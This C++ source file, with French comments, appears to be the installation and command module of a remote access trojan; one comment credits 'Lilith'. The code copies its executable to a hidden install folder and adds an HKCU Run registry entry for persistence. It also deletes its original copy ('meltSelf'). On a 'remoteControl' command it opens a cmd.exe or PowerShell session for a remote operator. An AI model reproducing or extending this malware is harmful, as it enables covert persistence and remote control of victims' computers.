// Created by Berlingot on 2023-04-17.
//


#include "Running.h"

bool Running::initialisation() { //initialisation, lancer au démarage de l'application
    //Navigation des fichier pour l'installation
    currentPath = getCurrentPath();
    installFolder = getInstallFolder();
    installPath = getInstallPath(installFolder);

    if(!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf){
        remove(lpArguments); // si pas d'argument lp -- l'efface
        // si argument -- sera prit en consideration pour l'installation
    }

    if (Settings::installSelf)
    {
        if (!locationSet())
        {
            setLocation();
            installing = true;
        }
    }

    if (Settings::setStartupSelf){
        if (!startupSet())
        {
            setStartup(StringConvertion::convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? StringConvertion::convStringToWidestring(installPath).c_str() : StringConvertion::convStringToWidestring(currentPath).c_str(), NULL);
        }
    }
    runInstalled();
    return installing;
}

std::string Running::getCurrentPath() {
    char buf[MAX_PATH];
    GetModuleFileName(0, buf, MAX_PATH); // https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea
    return std::string(buf); // retourne le chemain courrent de l'exe
}

std::string Running::getInstallFolder() { // fonction Lilith
    std::string rest;
    if (!(Settings::folderName.empty()))
        rest = "\\" + Settings::folderName;

    std::string concat;
    char* buf = 0;
    size_t sz = 0;
    if (_dupenv_s(&buf, &sz, Settings::installLocation.c_str()) == 0) //gets environment variable
        if (buf != nullptr)
        {

            concat = std::string(buf) + rest; //concatenates string
            free(buf);
        }
    return concat;
}

std::string Running::getInstallPath(const std::string& instFolder) {
    std::string concat;
    concat = instFolder + "\\" + Settings::fileName;

    return concat;
}

bool Running::locationSet() {
    if (Running::currentPath == Running::installPath)
        return true;
    else
        return false;
}

void Running::setLocation() {
    if (!Running::directoryExists(Running::installFolder.c_str()))
        if (!CreateDirectory(Running::installFolder.c_str(), NULL))	//tries to create folder
        {
            //todo a enlever
        }
    CopyFile(Running::currentPath.c_str(), Running::installPath.c_str(), 0);
}

bool Running::directoryExists(const char *dirName) {
    DWORD attribs = ::GetFileAttributesA(dirName);
    if (attribs == INVALID_FILE_ATTRIBUTES)
        return false;
    return true;			//original code : return (attribs & FILE_ATTRIBUTE_DIRECTORY); [CHANGED BC WARNING]
}

bool Running::startupSet() {
    if (Running::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
        return true;
    else
        return false;
}

bool Running::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName) {
    DWORD dwType = 0;
    long lResult = 0;
    HKEY hKeyPlaceholder = NULL;

    lResult = RegOpenKeyEx(hKey, keyPath, NULL, KEY_READ, &hKeyPlaceholder);
    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegQueryValueEx(hKeyPlaceholder, valueName, NULL, &dwType, NULL, NULL);

        if (lResult == ERROR_SUCCESS)
        {
            return true;
        }
        else
            return false;
    }
    else
        return false;
}

bool Running::installed() {//s'assure que l'executable est bien installé
    if (startupSet() && locationSet())
        return true;
    else
        return false;
}

void Running::runInstalled() {
    if (Running::installing)
        if (!Settings::startOnNextBoot){
            Running::startProcess(Running::installPath.c_str(), Settings::meltSelf ? StringConvertion::convStringToLPTSTR("t " + Running::currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
        }

}

void Running::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // grandeur de la structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // démarage du programme
    CreateProcess(lpApplicationName,
                  lpArguments,
                  NULL,
                  NULL,
                  FALSE,
                  0,
                  NULL,
                  NULL,
                  &si,
                  &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

bool Running::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
    HKEY hKey = NULL;
    LONG lResult = 0;
    bool fSuccess;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    wchar_t szValue[count] = {};


    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL)
    {

        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue) + 1) * 2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

std::string Running::processCommand(std::string command) {

    if (processParameter(command, "remoteControl"))
    {
        if (!CommandPrompt::cmdOpen)
        {
            if (command == "cmd")
                command = "C:\\WINDOWS\\system32\\cmd.exe";
            else if (command == "pws")
                command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            else if (command == "pws32")
                command = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";

            if (Utility::fileExists(command))
            {
                char* buffer = new char[command.length() + 3];
                buffer[command.length()] = '\0';
                strcpy_s(buffer, command.length() + 2, command.c_str());

                _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CommandPrompt::cmdThread, (LPVOID)buffer, NULL, NULL);
                while (!CommandPrompt::cmdOpen)
                {
                    Sleep(50);
                }
                delete[] buffer;
                return "CMD session opened.";
            }
            else
                return "File doesn't exist.";
        }
        else
        {
            CommandPrompt::cmdptr->writeCMD("exit");
            CommandPrompt::cmdOpen = false;
            return "CMD session closed";
        }
    }
    else
    {
        return "Command '" + command + "' was not recognized.";
    }
}

bool Running::processParameter(std::string &command, std::string compCommand) {
    std::string::size_type i = command.find(compCommand);
    if (i != std::string::npos)
    {
        command.erase(i, compCommand.length() + 1);
        return true;
    }
    else
        return false;
}
